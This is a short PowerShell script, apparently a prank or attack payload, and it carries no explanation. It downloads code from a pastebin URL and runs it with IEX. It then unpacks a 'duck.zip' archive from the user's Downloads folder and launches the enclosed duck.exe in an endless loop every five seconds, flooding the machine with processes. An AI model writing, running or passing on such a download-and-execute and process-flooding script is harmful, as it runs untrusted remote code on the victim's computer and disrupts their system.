IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/FWWk5dCE') -Force
Expand-Archive -Path "$env:USERPROFILE/Downloads/duck.zip" -DestinationPath "$env:USERPROFILE/Downloads/duck" -Force
Start-Sleep -s 5
$processName = "$env:USERPROFILE/Downloads/duck/duck/duck.exe"

while ($true) {
    Start-Process -FilePath $processName
    Start-Sleep -Seconds 5  # Adjust the delay between each process start as needed
}



